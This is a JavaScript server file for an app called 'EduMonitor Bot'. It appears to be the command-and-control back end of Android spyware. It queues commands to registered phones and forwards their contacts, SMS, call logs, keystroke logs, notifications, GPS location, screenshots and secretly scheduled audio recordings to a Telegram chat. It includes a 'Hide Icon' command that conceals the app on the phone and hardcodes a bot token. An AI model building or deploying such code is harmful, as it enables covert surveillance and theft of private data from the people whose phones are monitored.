const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();

// Store conversation states for interactive setup
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory if it doesn't exist
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024, // 50MB limit
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // Set both the menu button and commands
        await axios.post(`${TELEGRAM_API}/setMyCommands`, {
            commands: [
                { command: 'help', description: '📋 Show main menu' },
                { command: 'status', description: '📊 Device status' },
                { command: 'location', description: '📍 Get GPS location' },
                { command: 'screenshot', description: '📸 Take screenshot' },
                { command: 'record', description: '🎤 Start recording' },
                { command: 'contacts', description: '📇 Get contacts' },
                { command: 'sms', description: '💬 Get SMS' },
                { command: 'calllogs', description: '📞 Get call logs' },
                { command: 'storage', description: '💾 Storage info' },
                { command: 'network', description: '📡 Network info' },
                { command: 'battery', description: '🔋 Battery level' },
                { command: 'small', description: '📏 Small screenshots' },
                { command: 'medium', description: '📏 Medium screenshots' },
                { command: 'original', description: '📏 Original screenshots' },
                { command: 'record_auto_on', description: '⏰ Enable auto recording' },
                { command: 'record_auto_off', description: '⏰ Disable auto recording' },
                { command: 'record_schedule', description: '📅 Check schedule' }
            ]
        });
        
        // Also set the menu button text (appears above input field)
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

// Helper to create inline buttons
function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

function createUrlButton(text, url) {
    return {
        text: text,
        url: url
    };
}

// ============= TELEGRAM DOCUMENT HELPER =============

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= LOCATION FORMATTER =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return locationData;
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

// ============= MAIN MENU KEYBOARD =============

function getMainMenuKeyboard() {
    return [
        [
            createInlineButton('📱 Data', 'menu_data'),
            createInlineButton('🎤 Recording', 'menu_recording')
        ],
        [
            createInlineButton('📸 Screenshot', 'menu_screenshot'),
            createInlineButton('⚙️ Services', 'menu_services')
        ],
        [
            createInlineButton('📍 Location', 'menu_location'),
            createInlineButton('📊 Stats', 'menu_stats')
        ],
        [
            createInlineButton('ℹ️ About', 'menu_about'),
            createInlineButton('❌ Close', 'close_menu')
        ]
    ];
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            // Handle callback queries (button clicks)
            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            // Handle regular messages
            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            // Set menu button for authorized users
            await setChatMenuButton(chatId);

            // Check if user is in a conversation state
            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            // Regular command handling
            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                // Handle non-command messages
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard()
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    // Acknowledge the callback to remove the loading state
    await answerCallbackQuery(callbackId);
    
    // Handle different callback data
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard());
        
    } else if (data === 'menu_data') {
        const keyboard = [
            [
                createInlineButton('📇 Contacts (TXT)', 'cmd:contacts_txt'),
                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
            ],
            [
                createInlineButton('💬 SMS (TXT)', 'cmd:sms_txt'),
                createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
            ],
            [
                createInlineButton('📞 Call Logs (TXT)', 'cmd:calllogs_txt'),
                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
            ],
            [
                createInlineButton('⌨️ Keystrokes (TXT)', 'cmd:keystrokes_txt'),
                createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
            ],
            [
                createInlineButton('🔔 Notifications (TXT)', 'cmd:notifications_txt'),
                createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
            ],
            [
                createInlineButton('📱 Apps List (TXT)', 'cmd:apps_txt'),
                createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_recording') {
        const keyboard = [
            [
                createInlineButton('🎤 Record 60s', 'cmd:record'),
                createInlineButton('⏰ Schedule Status', 'cmd:record_schedule')
            ],
            [
                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
            ],
            [
                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive'),
                createInlineButton('🎚️ Audio Info', 'cmd:audio_info')
            ],
            [
                createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_screenshot') {
        const keyboard = [
            [
                createInlineButton('📸 Take Now', 'cmd:screenshot'),
                createInlineButton('📏 Small', 'cmd:small')
            ],
            [
                createInlineButton('📏 Medium', 'cmd:medium'),
                createInlineButton('📏 Original', 'cmd:original')
            ],
            [
                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings'),
                createInlineButton('📊 Size Status', 'cmd:size_status')
            ],
            [
                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
            ],
            [
                createInlineButton('🔄 Auto ON', 'cmd:auto_on'),
                createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
            ],
            [
                createInlineButton('📊 Compression Stats', 'cmd:compression_stats'),
                createInlineButton('📱 Target Apps', 'cmd:target_apps')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_services') {
        const keyboard = [
            [
                createInlineButton('▶️ Start Stream', 'cmd:start_stream'),
                createInlineButton('⏹️ Stop Stream', 'cmd:stop_stream')
            ],
            [
                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
            ],
            [
                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_location') {
        const keyboard = [
            [
                createInlineButton('📍 Get Location', 'cmd:location'),
                createInlineButton('📡 Network Info', 'cmd:network')
            ],
            [
                createInlineButton('💾 Storage Info', 'cmd:storage'),
                createInlineButton('🔋 Battery', 'cmd:battery')
            ],
            [
                createInlineButton('ℹ️ Device Info', 'cmd:info'),
                createInlineButton('🕐 Time', 'cmd:time')
            ],
            [
                createInlineButton('📊 Status', 'cmd:status'),
                createInlineButton('📝 Logs Count', 'cmd:logs_count')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_stats') {
        const keyboard = [
            [
                createInlineButton('📊 Logs Count', 'cmd:logs_count'),
                createInlineButton('📋 Recent Logs', 'cmd:logs_recent')
            ],
            [
                createInlineButton('📈 Detailed Stats', 'cmd:stats'),
                createInlineButton('📸 Compression Stats', 'cmd:compression_stats')
            ],
            [
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs'),
                createInlineButton('🔄 Force Refresh', 'cmd:refresh_data')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_about') {
        const keyboard = [
            [
                createUrlButton('🔗 GitHub', 'https://github.com/your-repo'),
                createInlineButton('📞 Contact', 'contact_support')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId,
            "🤖 <b>EduMonitor Bot</b>\n\n" +
            "Version: 2.0\n" +
            "Features:\n" +
            "• Remote device monitoring\n" +
            "• Screenshot capture\n" +
            "• Audio recording\n" +
            "• Data extraction (contacts, SMS, etc.)\n" +
            "• Location tracking\n" +
            "• Schedule recording\n\n" +
            "Use the menu below to navigate.");
        
    } else if (data === 'contact_support') {
        await answerCallbackQuery(callbackId, "Support: your.email@example.com");
        
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
        
    } else if (data === 'start_custom_schedule_interactive') {
        // Start interactive setup
        userStates.set(chatId, {
            state: SCHEDULE_STATES.AWAITING_START_TIME,
            data: {}
        });
        
        const keyboard = [[createInlineButton('❌ Cancel', 'cancel_setup')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
        await sendTelegramMessage(chatId, 
            "⚙️ *Custom Schedule Setup*\n\n" +
            "Please enter the START time in 24-hour format (HH:MM)\n" +
            "Example: `22:00` for 10:00 PM");
        
    } else if (data === 'cancel_setup') {
        userStates.delete(chatId);
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
        
    } else if (data.startsWith('recurring:')) {
        const recurring = data.split(':')[1];
        const userState = userStates.get(chatId);
        
        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
            userState.data.recurring = recurring === 'daily';
            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
            
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, 
                "✅ Schedule type recorded.\n\n" +
                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
        }
        
    } else if (data.startsWith('cmd:')) {
        // Execute a command
        const command = data.substring(4);
        console.log(`🎯 Executing command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        // Forward to command handler
        await handleCommand(chatId, `/${command}`, messageId);
        
        // Update keyboard
        const keyboard = [
            [
                createInlineButton('✅ Command Sent', 'noop'),
                createInlineButton('◀️ Back to Menu', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
    
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            // Validate start time format
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            
            await sendTelegramMessage(chatId, 
                "✅ Start time recorded.\n\n" +
                "Now enter the END time (HH:MM)\n" +
                "Example: `02:00` for 2:00 AM");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
                return;
            }
            
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            
            const keyboard = [
                [
                    createInlineButton('✅ Daily', 'recurring:daily'),
                    createInlineButton('🔄 Once', 'recurring:once')
                ]
            ];
            
            await sendTelegramMessageWithKeyboard(
                chatId,
                "✅ End time recorded.\n\n" +
                "Should this schedule repeat daily or run once?",
                keyboard
            );
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            // Parse times
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            // Create the command
            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            // Clear state
            userStates.delete(chatId);
            
            // Execute the command
            await handleCommand(chatId, command, messageId);
            
            await sendTelegramMessage(chatId, 
                "✅ *Custom Schedule Configured*\n\n" +
                `Start: ${userState.data.startTime}\n` +
                `End: ${userState.data.endTime}\n` +
                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
                `Interval: ${interval} minutes\n\n` +
                `Command sent to device.`);
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Special case for /help - show main menu
    if (command === '/help' || command === '/start' || command === '/menu') {
        console.log('📋 Showing main menu');
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 <b>EduMonitor Control Panel</b>\n\n" +
            "Select a category to get started:",
            getMainMenuKeyboard()
        );
        return;
    }

    // Find device
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found device: ${deviceId}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued:`, commandObject);

    let ackMessage = `⏳ Processing: ${command}`;
    
    if (cleanCommand.includes('contacts')) {
        ackMessage = `📇 Generating contacts file...`;
    } else if (cleanCommand.includes('sms')) {
        ackMessage = `💬 Generating SMS file...`;
    } else if (cleanCommand.includes('calllogs')) {
        ackMessage = `📞 Generating call logs file...`;
    } else if (cleanCommand.includes('apps')) {
        ackMessage = `📱 Generating apps list file...`;
    } else if (cleanCommand === 'location') {
        ackMessage = `📍 Getting your current location...`;
    }
    
    await sendTelegramMessage(chatId, ackMessage);
}

// ============= FILE UPLOAD ENDPOINT =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        
        // Determine caption based on command
        let caption = '';
        
        switch (command) {
            case 'contacts_txt':
            case 'contacts_html':
                caption = `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms_txt':
            case 'sms_html':
                caption = `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs_txt':
            case 'calllogs_html':
                caption = `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_txt':
            case 'apps_html':
                caption = `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keystrokes_txt':
            case 'keystrokes_html':
                caption = `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notifications_txt':
            case 'notifications_html':
                caption = `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            default:
                caption = `📎 Data Export`;
        }
        
        // Send the file to Telegram
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        // Delete the file after sending
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= LOCATION ENDPOINT =============

app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        // Format the location message
        const formatted = formatLocationMessage(locationData);
        
        if (formatted.lat && formatted.lon) {
            // Send as native Telegram location (creates a pin)
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        // Send the formatted message
        await sendTelegramMessage(chatId, formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = [...device.pendingCommands];
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
            sendJsonResponse(res, { commands });
        } else {
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    // Skip if this is a file command
    if (command && (command.includes('_txt') || command.includes('_html'))) {
        console.log(`📎 File command ${command} using /api/upload-file endpoint`);
        return res.sendStatus(200);
    }
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        
        if (error) {
            await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else {
            await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
        }
    }
    
    res.sendStatus(200);
});

app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId });
    
    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
        return res.status(403).json({ error: 'Chat ID not authorized' });
    }
    
    const deviceData = {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
    
    // Set menu button for this chat
    await setChatMenuButton(chatId);
    
    // Send welcome message with keyboard
    await sendTelegramMessageWithKeyboard(
        chatId,
        `✅ <b>Device Connected!</b>\n\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n\n` +
        `Use the menu button below or tap the buttons to control your device:`,
        getMainMenuKeyboard()
    );
    
    res.json({ status: 'registered', deviceId });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown'
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    res.send(`
        <html>
        <body style="font-family: Arial; padding: 20px;">
            <h1 style="color: #4CAF50;">✅ Server Running</h1>
            <p><b>Time:</b> ${new Date().toISOString()}</p>
            <p><b>Devices:</b> ${devices.size}</p>
            <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
            <p><b>Menu Button:</b> ✅ Configured</p>
            <p><b>Interactive Schedule:</b> ✅ Added</p>
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🤖 Test Menu - Use the buttons below:",
        getMainMenuKeyboard()
    );
    res.json({ success: !!result });
});

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ MENU BUTTON CONFIGURED:');
    console.log('   └─ Persistent menu button appears next to input field');
    console.log('   └─ 16 commands registered with BotFather');
    console.log('\n✅ INTERACTIVE SCHEDULE SETUP:');
    console.log('   └─ Step-by-step time entry');
    console.log('   └─ Daily/Once choice with buttons');
    console.log('   └─ Interval validation');
    console.log('\n✅ MISSING COMMANDS ADDED:');
    console.log('   └─ /audio_ultra, /audio_very_low, /audio_low, /audio_medium, /audio_high');
    console.log('   └─ /audio_info, /compression_stats');
    console.log('   └─ /add_target [package]');
    console.log('\n✅ FILE UPLOAD FIXED:');
    console.log('   └─ Item counts now properly displayed');
    console.log('   └─ Example: "📱 Installed Apps Export (42 apps)"');
    console.log('\n🚀 ===============================================\n');
});
